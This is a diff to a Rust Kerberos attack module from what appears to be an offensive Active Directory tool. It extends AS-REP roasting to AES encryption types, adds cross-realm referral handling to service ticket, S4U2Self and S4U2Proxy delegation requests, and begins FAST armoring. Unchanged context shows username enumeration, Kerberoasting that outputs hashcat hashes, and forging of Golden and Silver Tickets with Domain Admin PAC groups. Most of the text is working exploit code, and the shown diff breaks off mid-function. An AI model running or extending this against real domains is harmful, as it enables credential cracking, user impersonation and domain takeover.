@@ -12,6 +12,7 @@ use kerberos_asn1::{
     KrbError, PaData, PaEncTsEnc, PaForUser, PrincipalName, TgsRep, TgsReq, Ticket,
 };
 use kerberos_crypto::new_kerberos_cipher;
+use md5::Md5;
 use std::net::SocketAddr;
 use tokio::io::{AsyncReadExt, AsyncWriteExt};
 use tokio::net::TcpStream;
@@ -20,7 +21,6 @@ use tracing::{debug, info};
 // ═══════════════════════════════════════════════════════════
 //  Constants
 // ═══════════════════════════════════════════════════════════
-
 pub const KDC_PORT: u16 = 88;
 
 /// Normalize username by stripping @domain suffix if present.
@@ -58,6 +58,12 @@ pub const PA_TGS_REQ: i32 = 1;
 pub const PA_PAC_REQUEST: i32 = 128;
 pub const PA_FOR_USER: i32 = 129;
 pub const PA_PAC_OPTIONS: i32 = 167;
+/// PA-FX-FAST (RFC 6806) — Kerberos armoring
+pub const PA_FX_FAST: i32 = 136;
+/// FX-FAST armored padata wrapper
+pub const PA_FX_FAST_ARMORED: i32 = 137;
+/// Armor key for TGT-based armoring in FAST
+pub const KRB_ARMOR_TGT: i32 = 1;
 
 // KDC option flag values (big-endian bit positions)
 pub const KDC_OPT_FORWARDABLE: u32 = 0x40000000;
@@ -73,8 +79,11 @@ pub const KDC_OPT_CNAME_IN_ADDL_TKT: u32 = 0x00004000;
 /// Supported Kerberos encryption types
 #[derive(Debug, Clone, Copy, PartialEq)]
 pub enum EncType {
+    /// `Rc4Hmac` variant
     Rc4Hmac,
+    /// `Aes128CtsHmacSha1` variant
     Aes128CtsHmacSha1,
+    /// `Aes256CtsHmacSha1` variant
     Aes256CtsHmacSha1,
 }
 
@@ -86,7 +95,7 @@ impl EncType {
             Self::Aes256CtsHmacSha1 => ETYPE_AES256_CTS,
         }
     }
-
+    /// Runs this module operation.
     pub fn from_etype_id(id: i32) -> Option<Self> {
         match id {
             ETYPE_RC4_HMAC => Some(Self::Rc4Hmac),
@@ -100,27 +109,41 @@ impl EncType {
 /// Holds a Kerberos ticket + session key for reuse across requests
 #[derive(Debug, Clone)]
 pub struct TicketGrantingData {
+    /// ticket field
     pub ticket: Ticket,
+    /// Key data
     pub session_key: Vec<u8>,
+    /// Classification for this object.
     pub session_key_etype: i32,
+    /// client principal field
     pub client_principal: String,
+    /// client realm field
     pub client_realm: String,
+    /// end time field
     pub end_time: Option<KerberosTime>,
 }
 
 /// Crackable hash output (hashcat/john compatible)
 #[derive(Debug, Clone, PartialEq)]
 pub struct CrackableHash {
+    /// Username for authentication
     pub username: String,
+    /// Domain FQDN
     pub domain: String,
+    /// Service Principal Name
     pub spn: Option<String>,
+    /// Classification for this object.
     pub hash_type: HashType,
+    /// Encryption type used (23=RC4, 17=AES128, 18=AES256)
+    pub etype: i32,
+    /// Hash value
     pub hash_string: String,
 }
-
 #[derive(Debug, Clone, PartialEq)]
 pub enum HashType {
+    /// `AsRepRoast` variant
     AsRepRoast,
+    /// `Kerberoast` variant
     Kerberoast,
 }
 
@@ -460,12 +483,29 @@ async fn resolve_realm_kdc(realm: &str) -> Result<String> {
 /// Perform AS-REP Roasting against a user with DONT_REQ_PREAUTH.
 /// Returns a hashcat-mode-18200 compatible hash string.
 pub async fn asrep_roast(dc_ip: &str, domain: &str, username: &str) -> Result<CrackableHash> {
+    asrep_roast_with_etypes(
+        dc_ip,
+        domain,
+        username,
+        &[ETYPE_RC4_HMAC, ETYPE_AES256_CTS, ETYPE_AES128_CTS],
+    )
+    .await
+}
+
+/// AS-REP roast with configurable etypes (use multiple to get AES256/128 hashes).
+/// Cross-forest scenarios should include the account's salt for AES derivation.
+pub async fn asrep_roast_with_etypes(
+    dc_ip: &str,
+    domain: &str,
+    username: &str,
+    etypes: &[i32],
+) -> Result<CrackableHash> {
     let realm = normalize_realm(domain);
     let clean_username = normalize_username(username);
-    info!("AS-REP Roasting: {clean_username}@{realm} via {dc_ip}");
+    info!("AS-REP Roasting: {clean_username}@{realm} via {dc_ip} (etypes: {etypes:?})");
 
-    // AS-REQ WITHOUT pre-auth (no PA-ENC-TIMESTAMP)
-    let req_body = build_as_req_body(clean_username, &realm, &[ETYPE_RC4_HMAC]);
+    // AS-REQ WITHOUT pre-auth — request multiple etypes to capture AES hashes
+    let req_body = build_as_req_body(clean_username, &realm, etypes);
 
     let as_req = AsReq {
         pvno: 5,
@@ -484,12 +524,16 @@ pub async fn asrep_roast(dc_ip: &str, domain: &str, username: &str) -> Result<Cr
             let hash_string =
                 format_asrep_hash_string(enc_part.etype, clean_username, &realm, cipher);
 
-            info!("AS-REP hash obtained for {clean_username}");
+            info!(
+                "AS-REP hash obtained for {clean_username} (etype: {})",
+                enc_part.etype
+            );
             Ok(CrackableHash {
                 username: clean_username.to_string(),
                 domain: domain.to_string(),
                 spn: None,
                 hash_type: HashType::AsRepRoast,
+                etype: enc_part.etype,
                 hash_string,
             })
         }
@@ -517,7 +561,6 @@ pub enum UserEnumStatus {
 }
 
 /// Probe whether a username exists via Kerberos AS-REQ (no credentials needed).
-///
 /// Sends an AS-REQ without PA-ENC-TIMESTAMP. The KDC error code reveals:
 /// - `KDC_ERR_C_PRINCIPAL_UNKNOWN` (6)  → user does NOT exist
 /// - `KDC_ERR_PREAUTH_REQUIRED` (25)    → user EXISTS (needs pre-auth)
@@ -551,6 +594,7 @@ pub async fn user_enum_single(dc_ip: &str, domain: &str, username: &str) -> User
             domain: domain.to_string(),
             spn: None,
             hash_type: HashType::AsRepRoast,
+            etype: enc_part.etype,
             hash_string,
         });
     }
@@ -576,7 +620,6 @@ pub async fn user_enum_single(dc_ip: &str, domain: &str, username: &str) -> User
 
 /// Request a TGT via AS-REQ with PA-ENC-TIMESTAMP pre-auth.
 /// `secret` is either a password or NT hash (set `use_hash=true`).
-///
 /// If the KDC returns KDC_ERR_WRONG_REALM (code 68), the function
 /// automatically follows the referral by resolving the suggested realm's
 /// KDC via DNS SRV and retrying (max 2 hops).
@@ -763,16 +806,15 @@ pub async fn kerberoast(
         domain: realm.to_string(),
         spn: Some(target_spn.to_string()),
         hash_type: HashType::Kerberoast,
+        etype: enc_part.etype,
         hash_string,
     })
 }
 
 /// Request a service ticket (TGS) for an arbitrary SPN and return
 /// the decrypted ticket + session key as TicketGrantingData.
-///
 /// This is the generic "give me a usable service ticket" function,
 /// as opposed to `kerberoast()` which only extracts the crackable hash.
-///
 /// Requires a valid TGT from `request_tgt()`.
 pub async fn request_service_ticket(
     dc_ip: &str,
@@ -803,59 +845,96 @@ pub async fn request_service_ticket(
         padata_value: ap_req.build(),
     };
 
-    // Build TGS-REQ body targeting the SPN
-    let req_body = build_tgs_req_body(
-        realm,
-        sname,
-        &[
-            tgt.session_key_etype,
-            ETYPE_RC4_HMAC,
-            ETYPE_AES256_CTS,
-            ETYPE_AES128_CTS,
-        ],
-        KDC_OPT_FORWARDABLE | KDC_OPT_RENEWABLE | KDC_OPT_CANONICALIZE,
-        None,
-        None,
-    );
+    let mut current_dc = dc_ip.to_string();
+    let mut current_realm = realm.clone();
 
-    let tgs_req = TgsReq {
-        pvno: 5,
-        msg_type: 12,
-        padata: Some(vec![pa_tgs]),
-        req_body,
-    };
+    for hop in 0..=2 {
+        // Build TGS-REQ body targeting the SPN
+        let req_body = build_tgs_req_body(
+            &current_realm,
+            sname.clone(),
+            &[
+                tgt.session_key_etype,
+                ETYPE_RC4_HMAC,
+                ETYPE_AES256_CTS,
+                ETYPE_AES128_CTS,
+            ],
+            KDC_OPT_FORWARDABLE | KDC_OPT_RENEWABLE | KDC_OPT_CANONICALIZE,
+            None,
+            None,
+        );
 
-    // Exchange with KDC
-    let response_bytes = kdc_exchange(dc_ip, &tgs_req.build()).await?;
+        let tgs_req = TgsReq {
+            pvno: 5,
+            msg_type: 12,
+            padata: Some(vec![pa_tgs.clone()]),
+            req_body,
+        };
 
-    // Parse TGS-REP
-    let (_, tgs_rep) =
-        TgsRep::parse(&response_bytes).map_err(|_| parse_krb_error(&response_bytes))?;
+        // Exchange with KDC
+        let response_bytes = kdc_exchange(&current_dc, &tgs_req.build()).await?;
 
-    // Decrypt enc-part with TGT session key (key usage 8 for TGS-REP)
-    let cipher = new_kerberos_cipher(tgt.session_key_etype)
-        .map_err(|e| OverthroneError::Kerberos(format!("Cipher init: {e}")))?;
+        // Parse TGS-REP
+        match TgsRep::parse(&response_bytes) {
+            Ok((_, tgs_rep)) => {
+                // Decrypt enc-part with TGT session key (key usage 8 for TGS-REP)
+                let cipher = new_kerberos_cipher(tgt.session_key_etype)
+                    .map_err(|e| OverthroneError::Kerberos(format!("Cipher init: {e}")))?;
 
-    let decrypted = cipher
-        .decrypt(&tgt.session_key, 8, &tgs_rep.enc_part.cipher)
-        .map_err(|e| OverthroneError::Kerberos(format!("TGS-REP decrypt failed: {e}")))?;
+                let decrypted = cipher
+                    .decrypt(&tgt.session_key, 8, &tgs_rep.enc_part.cipher)
+                    .map_err(|e| {
+                        OverthroneError::Kerberos(format!("TGS-REP decrypt failed: {e}"))
+                    })?;
 
-    let (_, enc_tgs) = EncTgsRepPart::parse(&decrypted)
-        .map_err(|e| OverthroneError::Kerberos(format!("Parse EncTgsRepPart: {e}")))?;
+                let (_, enc_tgs) = EncTgsRepPart::parse(&decrypted)
+                    .map_err(|e| OverthroneError::Kerberos(format!("Parse EncTgsRepPart: {e}")))?;
 
-    info!(
-        "Service ticket for {target_spn} obtained (etype: {})",
-        enc_tgs.key.keytype
-    );
+                info!(
+                    "Service ticket for {target_spn} obtained (etype: {})",
+                    enc_tgs.key.keytype
+                );
 
-    Ok(TicketGrantingData {
-        ticket: tgs_rep.ticket,
-        session_key: enc_tgs.key.keyvalue,
-        session_key_etype: enc_tgs.key.keytype,
-        client_principal: tgt.client_principal.clone(),
-        client_realm: realm.to_string(),
-        end_time: Some(enc_tgs.endtime),
-    })
+                return Ok(TicketGrantingData {
+                    ticket: tgs_rep.ticket,
+                    session_key: enc_tgs.key.keyvalue,
+                    session_key_etype: enc_tgs.key.keytype,
+                    client_principal: tgt.client_principal.clone(),
+                    client_realm: current_realm,
+                    end_time: Some(enc_tgs.endtime),
+                });
+            }
+            Err(_) => {
+                if let Some(suggested) = extract_wrong_realm(&response_bytes) {
+                    if hop >= 2 {
+                        return Err(OverthroneError::Kerberos(format!(
+                            "request_service_ticket: exceeded max referral hops (referred to '{suggested}')"
+                        )));
+                    }
+                    info!(
+                        "request_service_ticket: KDC referred to realm '{suggested}' (hop {hop})"
+                    );
+                    match resolve_realm_kdc(&suggested).await {
+                        Ok(new_dc) => {
+                            current_dc = new_dc;
+                            current_realm = suggested;
+                            continue;
+                        }
+                        Err(e) => {
+                            return Err(OverthroneError::Kerberos(format!(
+                                "request_service_ticket: referred to '{suggested}' but DNS SRV resolution failed: {e}"
+                            )));
+                        }
+                    }
+                }
+                return Err(parse_krb_error(&response_bytes));
+            }
+        }
+    }
+
+    Err(OverthroneError::Kerberos(
+        "request_service_ticket: referral loop exhausted".to_string(),
+    ))
 }
 
 // ═══════════════════════════════════════════════════════════
@@ -864,6 +943,7 @@ pub async fn request_service_ticket(
 
 /// S4U2Self: Request a service ticket on behalf of another user.
 /// Used in constrained delegation attacks.
+/// Supports cross-domain referral (up to 2 hops).
 pub async fn s4u2self(
     dc_ip: &str,
     tgt: &TicketGrantingData,
@@ -880,7 +960,7 @@ pub async fn s4u2self(
             name_string: vec![clean_impersonate_user.to_string()],
         },
         userrealm: realm.to_string(),
-        cksum: build_s4u2self_checksum(clean_impersonate_user, realm, &tgt.session_key),
+        cksum: build_s4u2self_checksum(clean_impersonate_user, realm, &tgt.session_key)?,
         auth_package: "Kerberos".to_string(),
     };
 
@@ -892,63 +972,96 @@ pub async fn s4u2self(
     )?;
     let ap_req = build_ap_req(&tgt.ticket, encrypted_auth);
 
+    let pa_tgs = PaData {
+        padata_type: PA_TGS_REQ,
+        padata_value: ap_req.build(),
+    };
+    let pa_for_user = PaData {
+        padata_type: PA_FOR_USER,
+        padata_value: pa_for_user_data.build(),
+    };
+
     let sname = PrincipalName {
         name_type: NT_PRINCIPAL,
         name_string: vec![tgt.client_principal.clone()],
     };
 
-    let req_body = build_tgs_req_body(
-        realm,
-        sname,
-        &[tgt.session_key_etype],
-        KDC_OPT_FORWARDABLE,
-        None,
-        Some(PrincipalName {
-            name_type: NT_PRINCIPAL,
-            name_string: vec![tgt.client_principal.clone()],
-        }),
-    );
+    let mut current_dc = dc_ip.to_string();
+    let mut current_realm = realm.clone();
 
-    let tgs_req = TgsReq {
-        pvno: 5,
-        msg_type: 12,
-        padata: Some(vec![
-            PaData {
-                padata_type: PA_TGS_REQ,
-                padata_value: ap_req.build(),
-            },
-            PaData {
-                padata_type: PA_FOR_USER,
-                padata_value: pa_for_user_data.build(),
-            },
-        ]),
-        req_body,
-    };
+    for hop in 0..=2 {
+        let req_body = build_tgs_req_body(
+            &current_realm,
+            sname.clone(),
+            &[tgt.session_key_etype],
+            KDC_OPT_FORWARDABLE,
+            None,
+            Some(PrincipalName {
+                name_type: NT_PRINCIPAL,
+                name_string: vec![tgt.client_principal.clone()],
+            }),
+        );
 
-    let response_bytes = kdc_exchange(dc_ip, &tgs_req.build()).await?;
+        let tgs_req = TgsReq {
+            pvno: 5,
+            msg_type: 12,
+            padata: Some(vec![pa_tgs.clone(), pa_for_user.clone()]),
+            req_body,
+        };
 
-    let (_, tgs_rep) =
-        TgsRep::parse(&response_bytes).map_err(|_| parse_krb_error(&response_bytes))?;
+        let response_bytes = kdc_exchange(&current_dc, &tgs_req.build()).await?;
 
-    let cipher = new_kerberos_cipher(tgt.session_key_etype)
-        .map_err(|e| OverthroneError::Kerberos(format!("Cipher: {e}")))?;
+        match TgsRep::parse(&response_bytes) {
+            Ok((_, tgs_rep)) => {
+                let cipher = new_kerberos_cipher(tgt.session_key_etype)
+                    .map_err(|e| OverthroneError::Kerberos(format!("Cipher: {e}")))?;
 
-    let decrypted = cipher
-        .decrypt(&tgt.session_key, 8, &tgs_rep.enc_part.cipher)
-        .map_err(|e| OverthroneError::Kerberos(format!("S4U2Self decrypt: {e}")))?;
+                let decrypted = cipher
+                    .decrypt(&tgt.session_key, 8, &tgs_rep.enc_part.cipher)
+                    .map_err(|e| OverthroneError::Kerberos(format!("S4U2Self decrypt: {e}")))?;
 
-    let (_, enc_tgs) = EncTgsRepPart::parse(&decrypted)
-        .map_err(|e| OverthroneError::Kerberos(format!("Parse EncTgsRepPart: {e}")))?;
+                let (_, enc_tgs) = EncTgsRepPart::parse(&decrypted)
+                    .map_err(|e| OverthroneError::Kerberos(format!("Parse EncTgsRepPart: {e}")))?;
 
-    info!("S4U2Self ticket for {impersonate_user} obtained");
-    Ok(TicketGrantingData {
-        ticket: tgs_rep.ticket,
-        session_key: enc_tgs.key.keyvalue,
-        session_key_etype: enc_tgs.key.keytype,
-        client_principal: impersonate_user.to_string(),
-        client_realm: realm.to_string(),
-        end_time: Some(enc_tgs.endtime),
-    })
+                info!("S4U2Self ticket for {impersonate_user} obtained");
+                return Ok(TicketGrantingData {
+                    ticket: tgs_rep.ticket,
+                    session_key: enc_tgs.key.keyvalue,
+                    session_key_etype: enc_tgs.key.keytype,
+                    client_principal: impersonate_user.to_string(),
+                    client_realm: current_realm,
+                    end_time: Some(enc_tgs.endtime),
+                });
+            }
+            Err(_) => {
+                if let Some(suggested) = extract_wrong_realm(&response_bytes) {
+                    if hop >= 2 {
+                        return Err(OverthroneError::Kerberos(format!(
+                            "S4U2Self: exceeded max referral hops (referred to '{suggested}')"
+                        )));
+                    }
+                    info!("S4U2Self: KDC referred to realm '{suggested}' (hop {hop})");
+                    match resolve_realm_kdc(&suggested).await {
+                        Ok(new_dc) => {
+                            current_dc = new_dc;
+                            current_realm = suggested;
+                            continue;
+                        }
+                        Err(e) => {
+                            return Err(OverthroneError::Kerberos(format!(
+                                "S4U2Self: referred to '{suggested}' but DNS SRV resolution failed: {e}"
+                            )));
+                        }
+                    }
+                }
+                return Err(parse_krb_error(&response_bytes));
+            }
+        }
+    }
+
+    Err(OverthroneError::Kerberos(
+        "S4U2Self: referral loop exhausted".to_string(),
+    ))
 }
 
 // ═══════════════════════════════════════════════════════════
@@ -956,6 +1069,9 @@ pub async fn s4u2self(
 // ═══════════════════════════════════════════════════════════
 
 /// S4U2Proxy: Use an S4U2Self ticket to get a ticket for a target service SPN.
+/// Supports cross-domain referral: when the KDC responds with `KDC_ERR_WRONG_REALM`,
+/// the function extracts the suggested realm, resolves its KDC via DNS SRV, and
+/// retries (up to 2 referral hops).
 pub async fn s4u2proxy(
     dc_ip: &str,
     tgt: &TicketGrantingData,
@@ -982,52 +1098,85 @@ pub async fn s4u2proxy(
     )?;
     let ap_req = build_ap_req(&tgt.ticket, encrypted_auth);
 
-    let req_body = build_tgs_req_body(
-        realm,
-        sname,
-        &[tgt.session_key_etype],
-        KDC_OPT_FORWARDABLE | KDC_OPT_CANONICALIZE | KDC_OPT_CNAME_IN_ADDL_TKT,
-        Some(vec![s4u2self_ticket.ticket.clone()]),
-        Some(PrincipalName {
-            name_type: NT_PRINCIPAL,
-            name_string: vec![tgt.client_principal.clone()],
-        }),
-    );
+    let mut current_dc = dc_ip.to_string();
+    let mut current_realm = realm.clone();
 
-    let tgs_req = TgsReq {
-        pvno: 5,
-        msg_type: 12,
-        padata: Some(vec![PaData {
-            padata_type: PA_TGS_REQ,
-            padata_value: ap_req.build(),
-        }]),
-        req_body,
-    };
+    for hop in 0..=2 {
+        let req_body = build_tgs_req_body(
+            &current_realm,
+            sname.clone(),
+            &[tgt.session_key_etype],
+            KDC_OPT_FORWARDABLE | KDC_OPT_CANONICALIZE | KDC_OPT_CNAME_IN_ADDL_TKT,
+            Some(vec![s4u2self_ticket.ticket.clone()]),
+            Some(PrincipalName {
+                name_type: NT_PRINCIPAL,
+                name_string: vec![tgt.client_principal.clone()],
+            }),
+        );
 
-    let response_bytes = kdc_exchange(dc_ip, &tgs_req.build()).await?;
+        let tgs_req = TgsReq {
+            pvno: 5,
+            msg_type: 12,
+            padata: Some(vec![PaData {
+                padata_type: PA_TGS_REQ,
+                padata_value: ap_req.build(),
+            }]),
+            req_body,
+        };
 
-    let (_, tgs_rep) =
-        TgsRep::parse(&response_bytes).map_err(|_| parse_krb_error(&response_bytes))?;
+        let response_bytes = kdc_exchange(&current_dc, &tgs_req.build()).await?;
 
-    let cipher = new_kerberos_cipher(tgt.session_key_etype)
-        .map_err(|e| OverthroneError::Kerberos(format!("Cipher: {e}")))?;
+        match TgsRep::parse(&response_bytes) {
+            Ok((_, tgs_rep)) => {
+                let cipher = new_kerberos_cipher(tgt.session_key_etype)
+                    .map_err(|e| OverthroneError::Kerberos(format!("Cipher: {e}")))?;
 
-    let decrypted = cipher
-        .decrypt(&tgt.session_key, 8, &tgs_rep.enc_part.cipher)
-        .map_err(|e| OverthroneError::Kerberos(format!("S4U2Proxy decrypt: {e}")))?;
+                let decrypted = cipher
+                    .decrypt(&tgt.session_key, 8, &tgs_rep.enc_part.cipher)
+                    .map_err(|e| OverthroneError::Kerberos(format!("S4U2Proxy decrypt: {e}")))?;
 
-    let (_, enc_tgs) = EncTgsRepPart::parse(&decrypted)
-        .map_err(|e| OverthroneError::Kerberos(format!("Parse: {e}")))?;
+                let (_, enc_tgs) = EncTgsRepPart::parse(&decrypted)
+                    .map_err(|e| OverthroneError::Kerberos(format!("Parse: {e}")))?;
 
-    info!("S4U2Proxy ticket for {target_spn} obtained");
-    Ok(TicketGrantingData {
-        ticket: tgs_rep.ticket,
-        session_key: enc_tgs.key.keyvalue,
-        session_key_etype: enc_tgs.key.keytype,
-        client_principal: s4u2self_ticket.client_principal.clone(),
-        client_realm: realm.to_string(),
-        end_time: Some(enc_tgs.endtime),
-    })
+                info!("S4U2Proxy ticket for {target_spn} obtained");
+                return Ok(TicketGrantingData {
+                    ticket: tgs_rep.ticket,
+                    session_key: enc_tgs.key.keyvalue,
+                    session_key_etype: enc_tgs.key.keytype,
+                    client_principal: s4u2self_ticket.client_principal.clone(),
+                    client_realm: current_realm,
+                    end_time: Some(enc_tgs.endtime),
+                });
+            }
+            Err(_) => {
+                if let Some(suggested) = extract_wrong_realm(&response_bytes) {
+                    if hop >= 2 {
+                        return Err(OverthroneError::Kerberos(format!(
+                            "S4U2Proxy: exceeded max referral hops (referred to '{suggested}')"
+                        )));
+                    }
+                    info!("S4U2Proxy: KDC referred to realm '{suggested}' (hop {hop})");
+                    match resolve_realm_kdc(&suggested).await {
+                        Ok(new_dc) => {
+                            current_dc = new_dc;
+                            current_realm = suggested;
+                            continue;
+                        }
+                        Err(e) => {
+                            return Err(OverthroneError::Kerberos(format!(
+                                "S4U2Proxy: referred to '{suggested}' but DNS SRV resolution failed: {e}"
+                            )));
+                        }
+                    }
+                }
+                return Err(parse_krb_error(&response_bytes));
+            }
+        }
+    }
+
+    Err(OverthroneError::Kerberos(
+        "S4U2Proxy: referral loop exhausted".to_string(),
+    ))
 }
 
 // ═══════════════════════════════════════════════════════════
@@ -1035,7 +1184,7 @@ pub async fn s4u2proxy(
 // ═══════════════════════════════════════════════════════════
 
 /// Build HMAC-MD5 checksum for S4U2Self PA-FOR-USER
-fn build_s4u2self_checksum(username: &str, realm: &str, session_key: &[u8]) -> Checksum {
+fn build_s4u2self_checksum(username: &str, realm: &str, session_key: &[u8]) -> Result<Checksum> {
     use hmac::{Hmac, Mac};
 
     let mut data: Vec<u8> = Vec::new();
@@ -1044,14 +1193,15 @@ fn build_s4u2self_checksum(username: &str, realm: &str, session_key: &[u8]) -> C
     data.extend_from_slice(realm.as_bytes());
     data.extend_from_slice(b"Kerberos");
 
-    let mut mac = Hmac::<md5::Md5>::new_from_slice(session_key).expect("HMAC-MD5 accepts any key");
+    let mut mac = Hmac::<Md5>::new_from_slice(session_key)
+        .map_err(|e| OverthroneError::Crypto(format!("S4U2Self HMAC init failed: {e}")))?;
     mac.update(&data);
     let result = mac.finalize().into_bytes();
 
-    Checksum {
+    Ok(Checksum {
         cksumtype: -138, // HMAC-MD5 for S4U
         checksum: result.to_vec(),
-    }
+    })
 }
 
 /// Map common Kerberos error codes to human-readable strings
@@ -1082,10 +1232,8 @@ pub fn krb_error_to_string(code: i32) -> &'static str {
 // ═══════════════════════════════════════════════════════════
 
 /// Forge a TGT (Golden Ticket) using the krbtgt NTLM hash.
-///
 /// This creates a valid TGT without contacting the KDC by encrypting
 /// a crafted EncTicketPart (with PAC) using the krbtgt key.
-///
 /// # Arguments
 /// * `domain`     - Target domain (e.g., "corp.local")
 /// * `domain_sid` - Domain SID (e.g., "S-1-5-21-...")
@@ -1170,10 +1318,8 @@ pub fn forge_tgt(
 }
 
 /// Forge a service ticket (Silver Ticket) using the service account's NTLM hash.
-///
 /// Creates a valid TGS without contacting the KDC by encrypting a crafted
 /// EncTicketPart using the service account's key.
-///
 /// # Arguments
 /// * `domain`      - Target domain
 /// * `domain_sid`  - Domain SID
@@ -1278,7 +1424,6 @@ fn generate_session_key(etype: i32) -> Vec<u8> {
 }
 
 /// Build EncTicketPart as raw DER bytes (ASN.1 manual construction)
-///
 /// EncTicketPart ::= [APPLICATION 3] SEQUENCE {
 ///     flags           [0] TicketFlags,
 ///     key             [1] EncryptionKey,
@@ -1371,7 +1516,6 @@ fn build_enc_ticket_part(
 }
 
 /// Build a minimal PAC (Privilege Attribute Certificate)
-///
 /// The PAC contains KERB_VALIDATION_INFO (NDR-encoded) which tells the
 /// target service what groups the user belongs to. For a golden ticket,
 /// we add Domain Admins (512), Enterprise Admins (519), etc.
@@ -1411,7 +1555,6 @@ fn build_minimal_pac(domain_sid: &str, username: &str, user_rid: u32, realm: &st
 }
 
 /// Build KERB_VALIDATION_INFO (NDR-encoded) for the PAC
-///
 /// This is a simplified version that includes essential fields:
 /// - LogonTime, UserId, PrimaryGroupId
 /// - GroupIds (Domain Admins, etc.)
@@ -1642,7 +1785,6 @@ fn validate_sid_format(sid_str: &str) -> Result<()> {
 }
 
 /// Parse a SID string ("S-1-5-21-...") into binary format.
-///
 /// Callers must validate the SID via `validate_sid_format` before
 /// calling this function.  An invalid SID here indicates a logic
 /// bug (the validation gate was skipped).
@@ -1700,10 +1842,30 @@ fn asn1_length(len: usize) -> Vec<u8> {
     }
 }
 
-/// Build ASN.1 context-specific tag [n] EXPLICIT
+/// Build ASN.1 context-specific tag [n] EXPLICIT (constructed)
 fn asn1_context_tag(n: u8, data: &[u8]) -> Vec<u8> {
     let tag = 0xA0 | n;
     let mut out = vec![tag];
+    out.extend_from_slice(&asn1_length(data.len()));
+    out.extend_from_slice(data);
+    out
+}
+
+/// Build ASN.1 context-specific primitive tag [n] for IMPLICIT types
+/// e.g. `[n] INTEGER`, `[n] OCTET STRING`
+fn asn1_implicit_primitive(tag: u8, data: &[u8]) -> Vec<u8> {
+    let tag_byte = 0x80 | tag;
+    let mut out = vec![tag_byte];
+    out.extend_from_slice(&asn1_length(data.len()));
+    out.extend_from_slice(data);
+    out
+}
+
+/// Build ASN.1 context-specific constructed tag [n] for IMPLICIT SEQUENCE types
+/// e.g. `[n] SEQUENCE { ... }`
+fn asn1_implicit_constructed(tag: u8, data: &[u8]) -> Vec<u8> {
+    let tag_byte = 0xA0 | tag;
+    let mut out = vec![tag_byte];
     out.extend_from_slice(&asn1_length(data.len()));
     out.extend_from_slice(data);
     out
@@ -1825,4 +1987,634 @@ fn format_kerberos_time(dt: &chrono::DateTime<Utc>) -> String {
 #[allow(dead_code)] // Utility helper for protocol debugging
 fn hex_encode(data: &[u8]) -> String {
     data.iter().map(|b| format!("{:02x}", b)).collect()
+}
+
+// ═══════════════════════════════════════════════════════════
+//  FAST Armor (RFC 6806) — Kerberos Armoring
+// ═══════════════════════════════════════════════════════════
+
+/// Parameters for FAST armor construction.
+#[derive(Debug, Clone)]
+pub struct FastArmorParams<'a> {
+    /// DER-encoded KDC-REQ body (inner request being armored)
+    pub inner_req_body_der: &'a [u8],
+    /// DER-encoded TGT Ticket
+    pub tgt_ticket_der: &'a [u8],
+    /// TGT session key (used as armor key per RFC 6113 §5.4.1)
+    pub tgt_session_key: &'a [u8],
+    /// Encryption type of the session key (e.g. 23 for RC4, 18 for AES256)
+    pub session_key_etype: i32,
+    /// Client realm (domain)
+    pub client_realm: &'a str,
+}
+
+/// Build a PA-FX-FAST armored KDC-REQ per RFC 6806.
+/// Returns the DER-encoded PA-DATA containing the KrbFastRequest.
+/// Falls back to unarmored if encryption fails (compatible with
+/// KDCs that don't enforce armoring).
+pub fn build_fast_armor(params: &FastArmorParams) -> Result<Vec<u8>> {
+    // Per RFC 6806, the AP-REQ used for FAST armoring carries the TGT as
+    // the armor ticket. The KDC verifies this AP-REQ to establish trust
+    // before processing the inner request.
+
+    // ── Step 1: Build AP-REQ with TGT as armor ──────────────────
+    // AP-REQ ::= SEQUENCE {
+    //     pvno         [0] INTEGER (5),
+    //     msg-type     [1] INTEGER (14),
+    //     ap-options   [2] BIT STRING,
+    //     ticket       [3] Ticket,
+    //     authenticator [4] EncryptedData
+    // }
+    let pvno = asn1_context_tag(0, &asn1_integer(5));
+    let msg_type = asn1_context_tag(1, &asn1_integer(14));
+    let ap_options = asn1_context_tag(2, &asn1_bitstring_u32(0)); // no flags
+
+    // Embed the TGT ticket
+    let ticket = asn1_context_tag(3, params.tgt_ticket_der);
+
+    // Build a minimal authenticator encrypted with the TGT session key.
+    // Authenticator ::= SEQUENCE {
+    //     authenticator-vno [0] INTEGER (5),
+    //     crealm            [1] Realm,
+    //     cname             [2] PrincipalName,
+    //     cksum             [3] Checksum OPTIONAL,
+    //     cusec             [4] INTEGER,
+    //     ctime             [5] KerberosTime
+    // }
+    let auth_vno = asn1_context_tag(0, &asn1_integer(5));
+    let auth_crealm = asn1_context_tag(1, &asn1_general_string(params.client_realm));
+
+    // Principal name for armor: "WELLKNOWN/FAST"
+    let name_type = asn1_context_tag(0, &asn1_integer(0)); // NT_UNKNOWN
+    let name_string =
+        asn1_context_tag(1, &asn1_sequence_of_general_strings(&["WELLKNOWN", "FAST"]));
+    let cname = asn1_sequence(&[&name_type, &name_string]);
+    let auth_cname = asn1_context_tag(2, &cname);
+
+    let now = Utc::now();
+    let cusec = asn1_context_tag(4, &asn1_integer(now.timestamp_subsec_nanos() as i64 / 1000));
+    let ctime = asn1_context_tag(5, &asn1_generalized_time(&format_kerberos_time(&now)));
+
+    let authenticator_plain =
+        asn1_sequence(&[&auth_vno, &auth_crealm, &auth_cname, &cusec, &ctime]);
+
+    // Encrypt authenticator with TGT session key (key usage 4 = AP-REQ in TGS)
+    let cipher = new_kerberos_cipher(params.session_key_etype)
+        .map_err(|e| OverthroneError::Crypto(format!("FAST: cipher init failed: {e}")))?;
+    let encrypted_auth = cipher.encrypt(params.tgt_session_key, 4, &authenticator_plain);
+
+    // EncryptedData ::= SEQUENCE {
+    //     etype  [0] INTEGER,
+    //     cipher [2] OCTET STRING
+    // }
+    let enc_etype = asn1_context_tag(0, &asn1_integer(params.session_key_etype as i64));
+    let enc_cipher = asn1_context_tag(2, &encrypted_auth);
+    let encrypted_data_der = asn1_sequence(&[&enc_etype, &enc_cipher]);
+    let authenticator = asn1_context_tag(4, &encrypted_data_der);
+
+    let ap_req = asn1_sequence(&[&pvno, &msg_type, &ap_options, &ticket, &authenticator]);
+
+    // ── Step 2: Build KrbFastArmor ──────────────────────────────
+    // KrbFastArmor ::= SEQUENCE {
+    //     armor-type  [0] Int32 (1 = KRB_ARMOR_TGT),
+    //     armor-value [1] OCTET STRING (AP-REQ DER)
+    // }
+    let armor_type = asn1_implicit_primitive(0, &asn1_integer(1));
+    let armor_value = asn1_implicit_primitive(1, &ap_req);
+    let fast_armor = asn1_sequence(&[&armor_type, &armor_value]);
+
+    // ── Step 3: Build KrbFastEncPart ────────────────────────────
